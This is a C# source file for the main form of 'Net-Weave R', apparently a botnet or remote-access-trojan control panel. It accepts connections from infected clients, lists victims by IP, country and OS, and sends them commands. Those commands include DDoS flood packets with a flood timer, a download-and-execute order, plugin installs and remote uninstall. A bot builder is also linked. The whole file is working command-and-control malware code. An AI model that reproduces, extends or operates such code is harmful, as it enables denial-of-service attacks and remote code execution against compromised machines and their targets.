using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Net_Weave_R.Core;
using System.Diagnostics;
using System.Threading;
using Net_Weave_R.Misc;
using Net_Weave_R.Forms.Popups;
using NetLib.Forms.API;
using Net_Weave_R.Forms.Dialogs;
using NetLib.API;
using NetLib.Networking;
using System.IO;
using System.Runtime.InteropServices;
using NetLib.Misc;
using Mono.Nat;
namespace Net_Weave_R.Forms
{
    public partial class Main : Form
    {
        List<Listener> listeners;
        public List<Client> Clients;
        int received, sent;
        int peak, total;
        Size defSize = new Size(774, 487);
        NWR_Client.Client xClient;
        GeoIP geoIp;
        public byte[] FloodPacket;
        public int SelectionCount;
        public bool MultiFlood;
        public Main(NWR_Client.Client client)
        {
            InitializeComponent();
            Clients = null;
            xClient = client;
            Functions.Center(this);
            conAddr = new List<string>();
            Icon = GlobalProperties.ApplicationIcon;
            GlobalProperties.MainForm = this;
            log = new Log(this);
            received = 0;
            sent = 0;
            peak = 0;
            total = Settings.GetTotal();
            lblTotal.Text = "Total: " + total.ToString();
            SelectionCount = 0;
            MultiFlood = false;
            geoIp = new GeoIP();
            User32.RegisterHotKey(Handle, 0, 0, (int)Keys.F1);
            User32.RegisterHotKey(Handle, 1, 0, (int)Keys.F2);
            User32.RegisterHotKey(Handle, 2, 0, (int)Keys.F3);
            User32.RegisterHotKey(Handle, 3, 0, (int)Keys.F4);
            User32.RegisterHotKey(Handle, 4, 0, (int)Keys.F5);
            User32.RegisterHotKey(Handle, 5, 0, (int)Keys.F6);

            xClient.DataReceived += new EventHandler<NWR_Client.DataReceivedEventArgs>(xClient_DataReceived);
            xClient.Disconnected += new EventHandler(xClient_Disconnected);

            GlobalProperties.Client = xClient;
            PluginHelper.PluginChanged += new EventHandler(PluginHelper_PluginChanged);
            FloodTimer.TimerStarted += new EventHandler(FloodTimer_TimerStarted);
            FloodTimer.TimerAborted += new EventHandler(FloodTimer_TimerAborted);
            FloodTimer.TimerChanged += new FloodTimer.FloodTimerChangedEventHandler(FloodTimer_TimerChanged);
            FloodTimer.TimerFinished += new EventHandler(FloodTimer_TimerFinished);
            Load += new EventHandler(Main_Load);
            NatUtility.StartDiscovery();

            NatUtility.DeviceFound += (S, E) =>
                {
                    GlobalProperties.NatDevices.Add(E.Device);
                };
            NatUtility.DeviceLost += (S, E) =>
                {
                    GlobalProperties.NatDevices.Remove(E.Device);
                };

            GlobalProperties.NI = ni;
        }

        void Main_Load(object sender, EventArgs e)
        {
            Settings.Load();
        }

        #region FloodTimer
        void FloodTimer_TimerFinished(object sender, EventArgs e)
        {
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.FLOOD_STOP);
            Send(w.ToArray(true));
            Invoke((MethodInvoker)delegate
            {
                lblFloodTimer.Text = "Flood Timer: 00:00:00";
                lblFloodTimer.ForeColor = Color.Black;
            });
        }

        void FloodTimer_TimerChanged(TimeSpan remaining)
        {
            Invoke((MethodInvoker)delegate
            {
                lblFloodTimer.Text = "Flood Timer: " + remaining.ToString();
            });
        }

        void FloodTimer_TimerAborted(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)delegate
            {
                lblFloodTimer.ForeColor = Color.Red;
            });
        }

        void FloodTimer_TimerStarted(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)delegate
            {
                lblFloodTimer.ForeColor = Color.Green;
            });
        }
        #endregion

        #region ServerClient
        void xClient_Disconnected(object sender, EventArgs e)
        {
            MessageBox.Show("Connection lost from server!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(-1);
        }

        void xClient_DataReceived(object sender, NWR_Client.DataReceivedEventArgs e)
        {
            switch (e.Header)
            {
                case 0x8:
                    Invoke((MethodInvoker)delegate
                    {
                        bool b = e.Reader.ReadBoolean();
                        MessageBox.Show(e.Reader.ReadString(), "Global Message from Server", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                    break;
                case 0xFF:
                    //{
                    //    GlobalProperties.Client.SendPing();
                    //    GlobalProperties.Client.Alive = true;
                    //}
                    break;
            }
        }
        #endregion

        #region Listener Events
        List<string> conAddr;
        void listener_SocketAccepted(object sender, SocketConnectedEventArgs e)
        {
            Client client = new Client(e.AcceptedSocket);
            string addr = client.Address.Split(':')[0];
            if (Settings.DupPrevnt)
            {
                if (conAddr.Contains(addr))
                {
                    PacketWriter wr = new PacketWriter();
                    wr.Write((int)PacketHeader.LIMIT);
                    client.Send(wr.ToArray(true));
                    wr = null;
                    Invoke((MethodInvoker)delegate
                    {
                        GlobalProperties.NI.ShowBalloonTip(2000, "Duplication Prevention", "A client has been disconnected to prevent duplication.", ToolTipIcon.Error);
                    });
                    client.Close();
                    return;
                }
                else
                    conAddr.Add(addr);
            }


            Clients.Add(client);
            client.Disconnected += new Client.DisconnectedEventHandler(client_Disconnected);
            client.DataSent += new EventHandler<DataSentEventArgs>(client_DataSent);
            client.DataReceived += new EventHandler<DataReceivedEventArgs>(client_DataReceived);
            client.BeginRead();
        }
        void listen()
        {
            if (listeners == null)
            {
                listeners = new List<Listener>();
                Clients = new List<Client>();
                foreach (int port in Settings.Ports)
                {
                    Listener l = new Listener();
                    if (l.Listen(port))
                    {
                        l.SocketAccepted += listener_SocketAccepted;
                        EventLogger.LogEvent("Listening", "Successfully listening on port " + port.ToString());
                    }
                    else
                        EventLogger.LogEvent("Listening Failed", "Unable to listen on port " + port.ToString());
                    if (l.Running)
                        listeners.Add(l);
                }

                EventLogger.LogEvent("Started", "Net-Weave R has been started");

                startToolStripMenuItem.Text = startToolStripMenuItem.Text.Replace("Listen", "Stop");
                Pinger.Start(ref Clients);
            }
            else
            {
                Pinger.Stop();
                StatusDialog d = new StatusDialog();
                d.SetStatus("Stopping Listeners...");
                new Thread(delegate()
                    {
                        foreach (Listener l in listeners)
                        {
                            if (l.Running)
                            {
                                l.SocketAccepted -= listener_SocketAccepted;
                                l.Stop();
                                EventLogger.LogEvent("Listening Stopped", "The listener for port " + l.Port + " has been stopped");
                            }
                        }
                        Restart();
                        d.SetStatus("Disconnecting Clients...");
                        if (Clients.Count > 0)
                        {
                            for (int i = 0; i < Clients.Count; i++)
                            {
                                Clients[i].DataReceived -= client_DataReceived;
                                Clients[i].DataSent -= client_DataSent;
                                Clients[i].Disconnected -= client_Disconnected;
                                Clients[i].Close();
                            }
                        }
                        listeners.Clear();
                        listeners = null;
                        Clients.Clear();
                        Clients = null;
                        Invoke((MethodInvoker)delegate
                        {
                            EventLogger.LogEvent("Stopped", "Net-Weave R has been stopped");
                            startToolStripMenuItem.Text = startToolStripMenuItem.Text.Replace("Stop", "Listen");

                            lstClients.Items.Clear();
                            d.Close();
                        });
                    }).Start();
                d.ShowDialog();
            }
        }
        #endregion

        #region Client Events
        void client_DataReceived(object sender, DataReceivedEventArgs e)
        {
            Client client = (Client)sender;
            //try
            //{
                switch (e.Header)
                {
                    case (int)PacketHeader.PASSWORD:
                        {
                            PacketWriter w = new PacketWriter();
                            string pass = e.Reader.ReadString();
                            if (Settings.Passwords.Contains(pass) || pass == string.Empty || pass == "")
                            {
                                w.Write((int)PacketHeader.PASSWORD_ACCEPT);
                            }
                            else
                            {
                                w.Write((int)PacketHeader.PASSWORD_DENIED);
                                Invoke((MethodInvoker)delegate
                                {
                                    GlobalProperties.NI.ShowBalloonTip(1500, "Invalid Password", "The client was disconnected due to wrong password", ToolTipIcon.Error);
                                });
                                client.DisconnectNotify = false;
                            }
                            client.Send(w.ToArray(true));
                            w = null;
                        }
                        break;
                    case (int)PacketHeader.INFORMATION:
                        {
                            if (Settings.Limit != 0)
                            {
                                if (GlobalProperties.Online == Settings.Limit)
                                {
                                    PacketWriter w = new PacketWriter();
                                    w.Write((int)PacketHeader.LIMIT);
                                    client.Send(w.ToArray(true));
                                    w = null;
                                    Invoke((MethodInvoker)delegate
                                    {
                                        GlobalProperties.NI.ShowBalloonTip(2000, "Limit Reached", "New client will be disconnected due to connection limit", ToolTipIcon.Warning);
                                    });
                                    break;
                                }
                            }
                            GlobalProperties.Online++;
                            client.Lvi.SubItems.Add(client.KeyboardCountry = e.Reader.ReadString());
                            if (countryByGeoIPToolStripMenuItem.Checked)
                                client.Lvi.SubItems[1].Text = geoIp.lookupCountryName(client.Address.ToString().Split(':')[0]);
                            client.Lvi.SubItems.Add(Parser.GetOS(e.Reader.ReadString()));
                            client.Lvi.SubItems.Add("Idle");
                            client.Lvi.SubItems.Add(e.Reader.ReadString());
                            client.Lvi.SubItems.Add("UKN");
                            client.Lvi.SubItems.Add(client.Socket.Port.ToString());
                            client.Lvi.ImageIndex = Functions.GetCountryIndex(client.Lvi.SubItems[1].Text, flags);
                            Invoke((MethodInvoker)delegate
                            {
                                client.FullyConnected = true;
                                if (xHideIPs.Checked)
                                    client.Lvi.Text = string.Empty;
                                lstClients.Items.Add(client.Lvi);
                                if (scrollToLatestToolStripMenuItem.Checked)
                                    client.Lvi.EnsureVisible();
                                if (Settings.NotifyConnected)
                                    GlobalProperties.NI.ShowBalloonTip(3000, "Connection", string.Format("IP Address: {0}\nCountry: {1}\nOS: {2}\nVersion: {3}\nPort: {4}", (!xHideIPs.Checked ? client.Lvi.Text : "HIDDEN"), client.Lvi.SubItems[1].Text, client.Lvi.SubItems[2].Text, client.Lvi.SubItems[4].Text, client.Lvi.SubItems[6].Text), ToolTipIcon.Info);
                            });
                            if (Settings.LogDisconnected)
                                EventLogger.LogEvent("Connection", (!xHideIPs.Checked ? client.Lvi.Text : "Client") + " Connected");
                            if (GlobalProperties.Online > peak)
                            {
                                peak = GlobalProperties.Online;
                                updatePeak();
                            }
                            if (GlobalProperties.Online > total)
                            {
                                total = GlobalProperties.Online;
                                updateTotal();
                            }
                            updateOnline();

                            if (FloodPacket != null)
                                client.Send(FloodPacket);
                        }
                        break;

                    case (int)PacketHeader.STATUS:
                        try
                        {
                            client.SetStatus(Parser.GetStatus(e.Reader.ReadInt32(), e.Reader.ReadInt32()));
                        }
                        catch { }
                        break;

                    case (int)PacketHeader.PLUGIN_STATUS:
                        {
                            try
                            {
                                Guid guid = new Guid(e.Reader.ReadString());
                                int code = e.Reader.ReadInt32();
                                string add = e.Reader.ReadString();
                                client.SetStatus(Parser.GetPluginStatus(guid, code, add));
                            }
                            catch { }
                        }
                        break;

                    case (int)PacketHeader.PLUGIN_DATA:
                        {
                            try
                            {
                                int len = e.Reader.ReadInt32();
                                PluginArgs args = Serializer.Deserialize(e.Reader.ReadBytes(len));
                                GlobalProperties.InitializedPlugins[args.PluginGuid].OnReceived(args);
                            }
                            catch { }
                        }
                        break;
                    case (int)PacketHeader.SPEED:
                        {
                            try
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    client.Lvi.SubItems[5].Text = e.Reader.ReadDouble().ToString() + " KB/SEC";
                                });
                                string speed = Parser.GetTotalSpeed(Clients);
                                Invoke((MethodInvoker)delegate
                                {
                                    lblTotalSpeed.Text = "Total Speed: " + speed;
                                });
                            }
                            catch { }
                        }
                        break;
                    case (int)PacketHeader.CONFIRM:
                        {
                            client.Alive = true;
                            client.SendPing();
                        }
                        break;
                }
                received += e.Length;
                updateReceived();
            //}
            //catch { }
                if ((PacketHeader)e.Header != PacketHeader.PLUGIN_GET && (PacketHeader)e.Header != PacketHeader.PLUGIN_REMOVE && pluginView == null)
                    e.Reader.Close();
        }

        void client_DataSent(object sender, DataSentEventArgs e)
        {
            sent += e.Sent;
            updateSent();
        }

        void client_Disconnected(Client e)
        {
            Clients.Remove(e);
            conAddr.Remove(e.Address.Split(':')[0]);
            if (pluginView != null && e.FullyConnected)
                pluginView.RemoveClient(e);
            e.DataReceived -= client_DataReceived;
            e.DataSent -= client_DataSent;
            e.Disconnected -= client_Disconnected;
            if (e.DisconnectNotify && e.FullyConnected)
            {
                GlobalProperties.Online--;
                updateOnline();
            }
            if (!IsDisposed && e.DisconnectNotify)
            {
                Invoke((MethodInvoker)delegate
                {
                    lstClients.Items.Remove(e.Lvi);
                    if (e.DisconnectNotify)
                    {
                        if (Settings.NotifyDisconnected && e.FullyConnected)
                            GlobalProperties.NI.ShowBalloonTip(2000, "Disconnection", (!xHideIPs.Checked ? e.Address.Split(':')[0] : "Client") + " Disconnected", ToolTipIcon.Error);
                    }
                });
            }
            e.Close();
        }

        void updateOnline()
        {
            Invoke((MethodInvoker)delegate
            {
                lblOnline.Text = "Online: " + GlobalProperties.Online.ToString();
            });
        }
        #endregion

        #region Public Methods
        public void Send(byte[] data)
        {
            bool toAll = allToolStripMenuItem.Checked;
            new Thread(() =>
                {
                    if (toAll)
                        for (int i = 0; i < Clients.Count; i++)
                        {
                            Clients[i].Send(data);
                        }
                    else
                        for (int i = 0; i < Clients.Count; i++)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                if (Clients[i].Lvi.Selected)
                                    Clients[i].Send(data);
                            });
                        }
                }).Start();
        }
        public void RestartListeners()
        {
            if (listeners == null)
                return;
            StatusDialog d = new StatusDialog();
            new Thread(delegate()
                {
                    d.SetStatus("Restarting listeners...");
                    EventLogger.LogEvent("Restarting", "Listeners are restarting");
                    foreach (Listener l in listeners)
                    {
                        l.Stop();
                    }

                    listeners.Clear();

                    for (int i = 0; i < Settings.Ports.Count; i++)
                    {
                        Listener l = new Listener();
                        int port = Settings.Ports[i];
                        if (l.Listen(port))
                        {
                            l.SocketAccepted += listener_SocketAccepted;
                            EventLogger.LogEvent("Listening", "Successfully listening on port " + port.ToString());
                        }
                        else
                            EventLogger.LogEvent("Listening Failed", "Unable to listen on port " + port.ToString());
                        if (l.Running)
                            listeners.Add(l);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        d.Close();
                    });
                }).Start();
            d.ShowDialog();
        }
        public void ResetTotal()
        {
            total = 0;

            if (listeners != null)
            {
                total = Clients.Count;
            }

            lblTotal.Text = "Total: " + total.ToString();
        }
        #endregion

        #region Control Methods
        FloodPanel flooder;
        MultiFloodPanel flooder2;
        private void btnFloodPanel_Click(object sender, EventArgs e)
        {
            if (flooder == null && flooder2 == null)
            {
                using (FloodPanelTypeDialog d = new FloodPanelTypeDialog())
                {
                    if (d.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    {
                        if (d.Single)
                        {
                            if (flooder == null)
                            {
                                flooder = new FloodPanel(this);
                                flooder.Show();
                                flooder.FormClosed += (S, E) =>
                                    {
                                        flooder.Dispose();
                                        flooder = null;
                                    };
                            }
                        }
                        else
                        {
                            if (flooder2 == null)
                            {
                                flooder2 = new MultiFloodPanel(this);
                                flooder2.Show();
                                flooder2.FormClosed += (S, E) =>
                                    {
                                        flooder2.Dispose();
                                        flooder2 = null;
                                    };
                            }
                        }
                    }
                }
            }
            else if (flooder != null)
                flooder.BringToFront();
            else if (flooder2 != null)
                flooder2.BringToFront();
        }
        Log log;
        private void btnLog_Click(object sender, EventArgs e)
        {
            if (!log.Visible)
            {
                log.Show();
                btnLog.Text = "Log <";
            }
            else
            {
                log.Hide();
                btnLog.Text = "Log >";
            }
        }

        GUI_Settings gSettings;
        private void btnSettings_Click(object sender, EventArgs e)
        {
            if (gSettings == null)
            {
                gSettings = new GUI_Settings();
                gSettings.Show();
                gSettings.FormClosed += (S, E) =>
                {
                    gSettings.Dispose();
                    gSettings = null;
                };
            }
            else
                gSettings.BringToFront();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listen();
        }
        Builder builder;
        private void btnBuilder_Click(object sender, EventArgs e)
        {
            if (builder == null)
            {
                builder = new Builder();
                builder.Show();
                builder.FormClosed += (S, E) =>
                {
                    builder.Dispose();
                    builder = null;
                };
            }
            else
                builder.BringToFront();
        }
        Plugins plugins;
        private void btnPlugins_Click(object sender, EventArgs e)
        {
            if (plugins == null)
            {
                plugins = new Plugins();
                plugins.Show();
                plugins.FormClosed += (S, E) =>
                {
                    plugins.Dispose();
                    plugins = null;
                };
            }
        }

        private void builderF2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            btnBuilder_Click(null, null);
        }

        private void floodPanelF3ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            btnFloodPanel_Click(null, null);
        }

        private void settingsF5ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            btnSettings_Click(null, null);
        }
        Chat chat;
        private void chatF6ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chat == null)
            {
                chat = new Chat();
                chat.Show();
                chat.FormClosed += (S, E) =>
                {
                    chat.Dispose();
                    chat = null;
                };
            }
            else
                chat.BringToFront();
        }

        private void downloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (DownloadEx ex = new DownloadEx())
            {
                if (ex.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    PacketWriter w = new PacketWriter();
                    w.Write((int)PacketHeader.DOWNLOAD_EX);
                    w.Write(ex.IsUrl);
                    w.Write(ex.ExecuteOnly);
                    w.Write(ex.UpdatePassword);
                    w.Write(ex.FileLocation);
                    if (!ex.IsUrl)
                    {
                        byte[] b = File.ReadAllBytes(ex.FileLocation);
                        w.Write(b.Length);
                        w.Write(b);
                    }
                    Send(w.ToArray(true));
                }
            }
        }

        private void countryByGeoIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(delegate()
            {
                for (int i = 0; i < Clients.Count; i++)
                {
                    if (!countryByGeoIPToolStripMenuItem.Checked)
                    {
                        try
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Clients[i].Lvi.SubItems[1].Text = Clients[i].KeyboardCountry;
                                Clients[i].Lvi.ImageIndex = Functions.GetCountryIndex(Clients[i].Lvi.SubItems[1].Text, flags);
                            });
                        }
                        catch { }
                    }
                    else
                    {
                        try
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Clients[i].Lvi.SubItems[1].Text = geoIp.lookupCountryName(Clients[i].Lvi.Text);
                                Clients[i].Lvi.ImageIndex = Functions.GetCountryIndex(Clients[i].Lvi.SubItems[1].Text, flags);
                            });
                        }
                        catch { }
                    }
                }
            }).Start();
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (allToolStripMenuItem.Checked)
            {
                if (SelectionCount != -1)
                    SelectionCount = -1;
                return;
            }
            SelectionCount = lstClients.SelectedItems.Count;
            lblSelected.Text = "Selected: " + lstClients.SelectedItems.Count.ToString();
        }

        private void allToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (allToolStripMenuItem.Checked)
            {
                lblSelected.Text = "Selected: All";
                SelectionCount = -1;
            }
            else
                lblSelected.Text = "Selected: " + lstClients.SelectedItems.Count.ToString();
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.UNINSTALL);
            if (allToolStripMenuItem.Checked)
            {
                if (MessageBox.Show("This will uninstall all Clients.\n\nAre you sure?", "PERMEMENT ACTION", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == System.Windows.Forms.DialogResult.Yes)
                {
                    Send(w.ToArray(true));
                }
            }
            else
            {
                if (lstClients.SelectedItems.Count < 1)
                    return;

                if (MessageBox.Show(string.Format("This will uninstall {0} Client(s).\n\nAre you sure?", lstClients.SelectedItems.Count), "PERMEMENT ACTION", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == System.Windows.Forms.DialogResult.Yes)
                {
                    Send(w.ToArray(true));
                }
            }

            w = null;
        }

        private void sendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (PluginSelectorDialog d = new PluginSelectorDialog())
            {
                if (d.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    if (d.RawPluginList.Count > 0)
                        SendPlugins(d.RawPluginList);
                }
            }
        }

        BugReport report;
        private void bugReportToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (report == null)
            {
                report = new BugReport();
                report.Show();
                report.FormClosed += (S, E) =>
                {
                    report.Dispose();
                    report = null;
                };
            }
            else
                report.BringToFront();
        }
        PortMapper mapper;
        private void portMapperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (mapper == null)
            {
                mapper = new PortMapper();
                mapper.Show();
                mapper.FormClosed += (S, E) =>
                {
                    mapper.Dispose();
                    mapper = null;
                };
            }
            else
                mapper.BringToFront();
        }

        PluginView pluginView;
        private void viewToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (pluginView == null)
            {
                pluginView = new PluginView();
                pluginView.Show();
                pluginView.FormClosed += (S, E) =>
                {
                    pluginView.Dispose();
                    pluginView = null;
                };
                if (SelectionCount == -1)
                {
                    for (int i = 0; i < Clients.Count; i++)
                    {
                        pluginView.AddClient(Clients[i]);
                    }
                }
                else if (SelectionCount > 0)
                {
                    for (int i = 0; i < Clients.Count; i++)
                    {
                        if (Clients[i].Lvi.Selected)
                        {
                            pluginView.AddClient(Clients[i]);
                        }
                    }
                }
            }
            else
                pluginView.BringToFront();
        }

        private void xHideIPs_Click(object sender, EventArgs e)
        {
            if (Clients == null)
                return;
            new Thread(delegate()
            {
                if (xHideIPs.Checked)
                {
                    for (int i = 0; i < Clients.Count; i++)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Clients[i].Lvi.Text = string.Empty;
                        });
                    }
                }
                else
                {
                    for (int i = 0; i < Clients.Count; i++)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Clients[i].Lvi.Text = Clients[i].Address.ToString().Split(':')[0];
                        });
                    }
                }
            }).Start();
        }

        private void selectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Clients.Count; i++)
                {
                    if (Clients[i] != null && Clients[i].Lvi.Selected)
                        sb.AppendLine(Clients[i].Address.Split(':')[0]);
                }
                Clipboard.SetText(sb.ToString());
                sb = null;
                System.Media.SystemSounds.Beep.Play();
            }
            catch { }
        }

        private void allToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Clients.Count; i++)
                {
                    if (Clients[i] != null)
                        sb.AppendLine(Clients[i].Address.Split(':')[0]);
                }
                Clipboard.SetText(sb.ToString());
                sb = null;
                System.Media.SystemSounds.Beep.Play();
            }
            catch { }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            About about = new About();
            about.ShowDialog();
            about.Dispose();
        }
        #endregion

        #region WndProc
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case User32.WM_HOTKEY:
                    if (User32.GetForegroundWindow() == Handle)
                    {
                        switch ((int)m.WParam)
                        {
                            case 0:
                                startToolStripMenuItem_Click(null, null);
                                break;
                            case 1:
                                btnBuilder_Click(null, null);
                                break;
                            case 2:
                                btnFloodPanel_Click(null, null);
                                break;
                            case 3:
                                btnPlugins_Click(null, null);
                                break;
                            case 4:
                                btnSettings_Click(null, null);
                                break;
                            case 5:
                                chatF6ToolStripMenuItem_Click(null, null);
                                break;
                        }
                    }
                    break;
                default:
                    base.WndProc(ref m);
                    break;
            }
        }
        #endregion

        #region Private Methods
        void CloseAll()
        {
            if (listeners != null)
            {
                for (int i = 0; i < listeners.Count; i++)
                {
                    if (listeners[i].Running)
                    {
                        listeners[i].SocketAccepted -= listener_SocketAccepted;
                        listeners[i].Stop();
                    }
                }
                listeners.Clear();

                if (Clients.Count > 0)
                {
                    for (int i = 0; i < Clients.Count; i++)
                    {
                        try
                        {
                            Clients[i].DataReceived -= client_DataReceived;
                            Clients[i].DataSent -= client_DataSent;
                            Clients[i].Disconnected -= client_Disconnected;
                            Clients[i].Close();
                        }
                        catch { }
                    }
                    Clients.Clear();
                }

                listeners = null;
                Clients = null;
            }
        }
        void Restart()
        {
            lblOnline.Text = "Online: 0";
            lblFloodTimer.Text = "Flood Timer: 00:00:00";
            GlobalProperties.Online = 0;
        }
        void updateSent()
        {
            string str = Functions.FormatBytes(sent);
            Invoke((MethodInvoker)delegate
            {
                log.SetSent(str);
                //lblSent.Text = "Sent: " + str;
            });
        }
        void updateReceived()
        {
            string str = Functions.FormatBytes(received);
            Invoke((MethodInvoker)delegate
            {
                log.SetRecv(str);
                //lblReceived.Text = "Received: " + str;
            });
        }
        void updateTotal()
        {
            Invoke((MethodInvoker)delegate
            {
                lblTotal.Text = "Total: " + total.ToString();
            });
        }
        void updatePeak()
        {
            Invoke((MethodInvoker)delegate
            {
                lblPeak.Text = "Peak: " + peak.ToString();
            });
        }
        void SendPlugins(List<byte[]> pluginList)
        {
            new Thread(delegate()
                {
                    for (int i = 0; i < pluginList.Count; i++)
                    {
                        PacketWriter w = new PacketWriter();
                        w.Write((int)PacketHeader.PLUGIN_STORE);
                        w.Write(pluginList[i].Length);
                        w.Write(pluginList[i]);
                        Send(w.ToArray(true));
                    }
                }).Start();
        }
        public void ReloadPlugins()
        {
            List<ToolStripMenuItem> pluginItems = new List<ToolStripMenuItem>();
            foreach (XPlugin plugin in GlobalProperties.InitializedPlugins.Values)
            {
                if (!plugin.HasForm)
                    continue;
                ToolStripMenuItem item = new ToolStripMenuItem();
                item.Text = plugin.Name;
                item.Tag = plugin;
                item.ToolTipText = string.Format("Author: {0}\nDescription: {1}\nVersion: {2}", plugin.Author, plugin.Description, plugin.Version.ToString());
                item.Click += (Sender, E) =>
                {
                    Form form = ((Sender as ToolStripMenuItem).Tag as XPlugin).InputForm;
                    form.Icon = GlobalProperties.ApplicationIcon;
                    form.FormClosed += new FormClosedEventHandler(form_FormClosed);
                    form.Show();
                };
                plugin.DataReady += new DataReadyEventHandler(plugin_DataReady);
                pluginItems.Add(item);
            }
            pluginItems.Sort(new xToolStripItemComparer());
            if (pluginsToolStripMenuItem.DropDownItems.Count > 3)
            {
                for (int i = 0; i < pluginsToolStripMenuItem.DropDownItems.Count - 3; i++)
                {
                    pluginsToolStripMenuItem.DropDownItems.Remove(pluginsToolStripMenuItem.DropDownItems[pluginsToolStripMenuItem.DropDownItems.Count - 1]);
                }
            }
            pluginsToolStripMenuItem.DropDownItems.AddRange(pluginItems.ToArray());
            pluginItems.Clear();
        }
        void plugin_DataReady(object sender, PluginArgs e)
        {
            byte[] data = Serializer.Serialize(e);
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.PLUGIN_EXECUTE);
            w.Write(data.Length);
            w.Write(data);
            Send(w.ToArray(true));
        }

        void PluginHelper_PluginChanged(object sender, EventArgs e)
        {
            ReloadPlugins();
        }

        void form_FormClosed(object sender, FormClosedEventArgs e)
        {
            ((Form)sender).Dispose();
        }       
        #endregion

        #region Fade
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            //Notify.KillAndClose();
            ni.Dispose();
            CloseAll();
            Pinger.Stop();

            SettingsWriter w = new SettingsWriter(Settings.Reg);
            w.Write(total, "TOTAL");
            w.Close("Total");

            GlobalProperties.Client.Close();

            if (Opacity != 0.0)
            {
                e.Cancel = true;
                new Thread(() =>
                {
                    while (Opacity != 0.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity -= 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnFormClosing(e);
                        Environment.Exit(0);
                    });
                }).Start();
            }
        }
        protected override void OnVisibleChanged(EventArgs e)
        {
            if (Visible)
            {
                Opacity = 0.0;
                new Thread(() =>
                {
                    while (Opacity != 1.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity += 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnVisibleChanged(e);
                    });
                }).Start();
            }
        }
        #endregion
    }
}
